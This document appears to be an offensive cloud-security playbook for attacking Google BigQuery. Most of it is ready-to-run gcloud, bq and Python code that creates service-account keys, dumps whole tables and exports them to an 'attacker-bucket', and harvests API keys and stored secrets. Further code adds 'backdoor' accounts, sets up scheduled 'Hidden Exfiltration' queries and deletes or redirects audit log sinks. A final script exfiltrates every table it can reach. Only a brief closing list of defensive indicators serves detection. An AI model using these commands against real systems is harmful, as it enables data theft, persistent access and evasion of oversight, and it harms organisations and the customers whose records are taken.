# GCP BigQuery Exploitation & Data Extraction

## Overview

Google BigQuery is a powerful data warehouse often containing sensitive analytics:
- Petabyte-scale queries possible
- Weak IAM configurations common
- Shared datasets frequently accessible
- Service account keys often exposed
- Query history retained indefinitely
- Data export controls frequently missing

---

## BigQuery Enumeration

### 1. Identify Projects and Datasets

```bash
# List projects accessible to current principal
gcloud projects list --format="table(projectId, name, projectNumber)"

# List datasets in project
gcloud bq ls --project_id={project-id}

# Get detailed dataset information
bq show --project_id={project-id} {dataset-id}

# List all tables in dataset
bq ls --project_id={project-id} {dataset-id}
```

### 2. Service Account Discovery

```bash
# Find service accounts with BigQuery permissions
gcloud iam service-accounts list --project={project-id}

# Get service account keys
gcloud iam service-accounts keys list \
  --iam-account=bigquery-sa@{project-id}.iam.gserviceaccount.com

# Export key for use
gcloud iam service-accounts keys create key.json \
  --iam-account=bigquery-sa@{project-id}.iam.gserviceaccount.com

# Authenticate with service account
export GOOGLE_APPLICATION_CREDENTIALS=key.json
```

### 3. Dataset Permissions

```bash
# Check who has access to datasets
bq show --project_id={project-id} --format=json {dataset-id} | jq '.access'

# Check table-level permissions
bq show --project_id={project-id} {dataset-id}.{table-id}
```

---

## Connection Methods

### 1. Via Service Account Key

```bash
# Authenticate with service account
gcloud auth activate-service-account \
  --key-file=service-account-key.json

# Set project
gcloud config set project {project-id}

# Test access
bq ls
```

### 2. Via User Credentials

```bash
# If you have user credentials
gcloud auth login

# Access BigQuery
bq query --project_id={project-id} --use_legacy_sql=false \
  "SELECT * FROM \`project.dataset.table\` LIMIT 10"
```

### 3. Via Service Account Impersonation

```bash
# If you have permission to impersonate service account
gcloud iam service-accounts get-identity-binding \
  --service-account={sa}@{project}.iam.gserviceaccount.com

# Impersonate for temporary access
gcloud auth application-default print-access-token \
  --impersonate-service-account=bq-sa@{project}.iam.gserviceaccount.com
```

---

## Data Enumeration

### 1. Identify Sensitive Tables

```bash
# List all tables with metadata
bq ls --project_id={project-id} --format=json {dataset-id} | jq '.[].tableReference.tableId'

# Get table schema to identify sensitive columns
bq show --format=json {dataset-id}.{table-id} | jq '.schema.fields[] | {name: .name, type: .type}'

# Find tables with sensitive naming
bq ls --project_id={project-id} {dataset-id} | grep -i "customer\|payment\|credit\|user\|credential\|secret"
```

### 2. Query for Sensitive Data

```bash
# Find records with PII
bq query --use_legacy_sql=false << 'EOF'
SELECT *
FROM `project.dataset.customers`
WHERE email LIKE '%@%' 
  AND country IN ('US', 'UK', 'CA')
LIMIT 10000
EOF

# Find payment information
bq query --use_legacy_sql=false << 'EOF'
SELECT *
FROM `project.dataset.transactions`
WHERE amount > 1000
  AND payment_type IN ('credit_card', 'bank_transfer')
EOF

# Identify tables by data volume (likely important)
bq query --use_legacy_sql=false << 'EOF'
SELECT
  table_schema,
  table_name,
  row_count,
  ROUND(size_bytes/1024/1024/1024, 2) as gb
FROM `project.dataset.__TABLES__`
ORDER BY size_bytes DESC
LIMIT 20
EOF
```

---

## Bulk Data Extraction

### 1. Export via Query Results

```bash
# Execute query and export to CSV
bq query --project_id={project-id} \
  --use_legacy_sql=false \
  --format=csv \
  "SELECT * FROM \`project.dataset.sensitive_table\`" \
  > data_export.csv

# Export to GCS
bq query --project_id={project-id} \
  --use_legacy_sql=false \
  --destination_table project:dataset.export_table \
  --replace \
  "SELECT * FROM \`project.dataset.sensitive_table\`"

# Copy to GCS
gsutil cp gs://project-bucket/export_table.csv ./
```

### 2. Parallel Extraction

```bash
#!/bin/bash
# Extract large dataset in parallel chunks

PROJECT_ID="target-project"
DATASET="production"
TABLE="customers"
OUTPUT_DIR="extracted_data"

mkdir -p $OUTPUT_DIR

# Get total row count
TOTAL_ROWS=$(bq query --use_legacy_sql=false --format=csv \
  "SELECT COUNT(*) FROM \`${PROJECT_ID}.${DATASET}.${TABLE}\`" | tail -n 1)

echo "[*] Total rows: $TOTAL_ROWS"

# Extract in 10k row chunks
CHUNK_SIZE=10000
CHUNKS=$((($TOTAL_ROWS + $CHUNK_SIZE - 1) / $CHUNK_SIZE))

for ((i=0; i<$CHUNKS; i++)); do
  OFFSET=$((i * CHUNK_SIZE))
  CHUNK_FILE="$OUTPUT_DIR/chunk_${i}.csv"
  
  echo "[*] Extracting chunk $i (offset $OFFSET)"
  
  bq query --use_legacy_sql=false --format=csv \
    "SELECT * FROM \`${PROJECT_ID}.${DATASET}.${TABLE}\` 
     LIMIT $CHUNK_SIZE OFFSET $OFFSET" \
    > $CHUNK_FILE &
done

wait
echo "[+] Extraction complete: $OUTPUT_DIR"
```

### 3. Export to Cloud Storage with Authentication Bypass

```bash
#!/bin/bash
# If you control service account with GCS write permissions

cat > export_bigquery.py << 'EOF'
from google.cloud import bigquery
from google.cloud import storage
import os

# Use service account key
os.environ['GOOGLE_APPLICATION_CREDENTIALS'] = 'service-account-key.json'

bq_client = bigquery.Client()
storage_client = storage.Client()

project_id = 'target-project'
dataset_id = 'production'
table_ids = ['customers', 'orders', 'payments']

# Export each table
for table_id in table_ids:
    table_ref = f'{project_id}.{dataset_id}.{table_id}'
    
    # Create GCS export job
    job_config = bigquery.ExtractJobConfig()
    job_config.print_header = True
    
    extract_job = bq_client.extract_table(
        table_ref,
        f'gs://attacker-bucket/{table_id}_*.csv',
        job_config=job_config,
        location='US'
    )
    
    extract_job.result()
    print(f'Exported {table_ref} to GCS')

# Download from GCS
bucket = storage_client.bucket('attacker-bucket')
for blob in bucket.list_blobs():
    print(f'Downloaded: {blob.name}')
EOF

python3 export_bigquery.py
```

---

## Credential Extraction

### 1. Service Account Keys in Queries

```bash
# Queries might reveal service account keys stored in data
bq query --use_legacy_sql=false << 'EOF'
SELECT *
FROM `project.dataset.secrets`
WHERE key_type = 'service_account'
EOF

# Extract and use for lateral movement
python3 << 'PYEOF'
from google.oauth2 import service_account

# Use extracted service account key
credentials = service_account.Credentials.from_service_account_file(
    'extracted-sa-key.json'
)

# Authenticate to GCP services
from google.cloud import bigquery
client = bigquery.Client(credentials=credentials)

# Access other resources
PYEOF
```

### 2. API Keys in Queries

```bash
# Find API keys in stored data
bq query --use_legacy_sql=false << 'EOF'
SELECT *
FROM `project.dataset.configuration`
WHERE value REGEXP 'AIza[0-9A-Za-z_-]{35}'
EOF

# Extract and use
API_KEY=$(bq query --use_legacy_sql=false --format=csv \
  "SELECT api_key FROM \`project.dataset.configuration\` LIMIT 1" | tail -n 1)

# Use for unauthorized API access
curl -H "X-API-Key: $API_KEY" https://api.example.com/data
```

### 3. Database Connection Strings

```bash
# Find connection strings for other databases
bq query --use_legacy_sql=false << 'EOF'
SELECT *
FROM `project.dataset.settings`
WHERE value LIKE '%://%'
EOF
```

---

## Privilege Escalation

### 1. Create Custom IAM Roles

```bash
# If you have iam.roles.create permission
gcloud iam roles create bigquery_admin_bypass \
  --project={project-id} \
  --title="BigQuery Admin Bypass" \
  --description="Full BigQuery access" \
  --permissions=bigquery.datasets.*,bigquery.tables.*,bigquery.jobs.*

# Assign to principal
gcloud projects add-iam-policy-binding {project-id} \
  --member=serviceAccount:backdoor@{project-id}.iam.gserviceaccount.com \
  --role=projects/{project-id}/roles/bigquery_admin_bypass
```

### 2. Exploit Dataset-Level Permissions

```bash
# If you have dataset editor role
bq update \
  --set_iam_policy=/dev/stdin \
  {dataset-id} << 'EOF'
{
  "bindings": [
    {
      "role": "roles/bigquery.dataEditor",
      "members": [
        "serviceAccount:backdoor@{project-id}.iam.gserviceaccount.com"
      ]
    }
  ]
}
EOF
```

---

## Persistence Installation

### 1. Scheduled Queries for Exfiltration

```bash
# Create scheduled query that exports data periodically
bq mk --transfer_config \
  --project_id={project-id} \
  --data_source=scheduled_query \
  --target_dataset=export_dataset \
  --display_name="Hidden Exfiltration" \
  --params='{
    "query": "SELECT * FROM `project.dataset.sensitive_table`",
    "destination_table_name_template": "exfil_{run_date}",
    "write_disposition": "WRITE_TRUNCATE",
    "partitioning_option": ""
  }' \
  --schedule="every 6 hours"
```

### 2. Unauthorized Service Account Creation

```bash
# If you have iam.serviceAccounts.create permission
gcloud iam service-accounts create bigquery-persistence \
  --project={project-id} \
  --display-name="Maintenance Service Account"

# Grant BigQuery permissions
gcloud projects add-iam-policy-binding {project-id} \
  --member=serviceAccount:bigquery-persistence@{project-id}.iam.gserviceaccount.com \
  --role=roles/bigquery.admin

# Create and export key
gcloud iam service-accounts keys create key.json \
  --iam-account=bigquery-persistence@{project-id}.iam.gserviceaccount.com
```

### 3. Dataset Snapshots for Backup Access

```bash
# Create dataset snapshots (point-in-time backups)
# These can be used for long-term persistence

bq mk --transfer_config \
  --project_id={project-id} \
  --data_source=scheduled_query \
  --target_dataset=dataset_backups \
  --display_name="Dataset Snapshot" \
  --params='{
    "query": "SELECT * FROM `project.dataset.*`",
    "destination_table_name_template": "backup_{dataset}_{run_date}"
  }' \
  --schedule="every 24 hours"
```

---

## Detection Evasion

### 1. Query History Manipulation

```bash
# BigQuery maintains audit logs - but you can minimize evidence
# Use saved queries instead of ad-hoc queries (different logging)

bq mk --transfer_config \
  --project_id={project-id} \
  --display_name="Routine Data Review" \
  --data_source=scheduled_query \
  --target_dataset=results \
  --params='{
    "query": "SELECT * FROM `project.dataset.sensitive_table` WHERE created_date > CURRENT_DATE() - 1"
  }'

# Schedule during normal business hours to blend in
# Use service account instead of user identity
```

### 2. Use Authorized Views

```bash
# Create authorized view that returns subset of data
# Harder to detect than direct table access

bq mk --view \
  "SELECT customer_id, purchase_amount FROM \`project.dataset.transactions\` WHERE amount > 0" \
  --project_id={project-id} \
  {dataset-id}.normalized_transactions

# Access through view (appears as normal analysis)
bq query << 'EOF'
SELECT * FROM `project.dataset.normalized_transactions`
EOF
```

### 3. Disable Audit Logging

```bash
# If you have logging.admin role
gcloud logging sinks delete bigquery-audit-sink \
  --project={project-id}

# Or redirect logs to attacker-controlled location
gcloud logging sinks update bigquery-sink \
  --log-filter='resource.type="bigquery_project"' \
  --destination='storage.googleapis.com/attacker-bucket' \
  --project={project-id}
```

---

## Comprehensive BigQuery Attack

```bash
#!/bin/bash
# Complete BigQuery exploitation chain

echo "[*] GCP BigQuery Exploitation"

# 1. Find accessible projects
echo "[*] Enumerating projects..."
gcloud projects list --format="value(projectId)" > projects.txt

# 2. For each project, enumerate datasets
while read project; do
  echo "[+] Project: $project"
  
  # List datasets
  gcloud bq ls --project_id=$project > datasets.txt 2>/dev/null || continue
  
  # For each dataset, list tables
  while read dataset; do
    echo "  [*] Dataset: $dataset"
    gcloud bq ls --project_id=$project $dataset > tables.txt
    
    # For each table, export data
    while read table; do
      echo "    [*] Exporting: $table"
      
      bq query --project_id=$project --use_legacy_sql=false \
        --format=csv \
        "SELECT * FROM \`$project.$dataset.$table\`" \
        > ${project}-${dataset}-${table}.csv 2>/dev/null &
    done < tables.txt
  done < datasets.txt
done < projects.txt

wait
echo "[+] BigQuery exploitation complete"
```

---

## Defensive Indicators

Monitor for:
- Service account key exports
- Unusual BigQuery query patterns (non-business hours, high-volume)
- Exports to unauthorized GCS buckets
- Scheduled query creation
- Dataset permission modifications
- Access to sensitive datasets from unusual locations/IPs
- Service account impersonation
- Large data extractions
- Scheduled query job failures (permission denied indicates probe)
- Query results exported via multiple channels
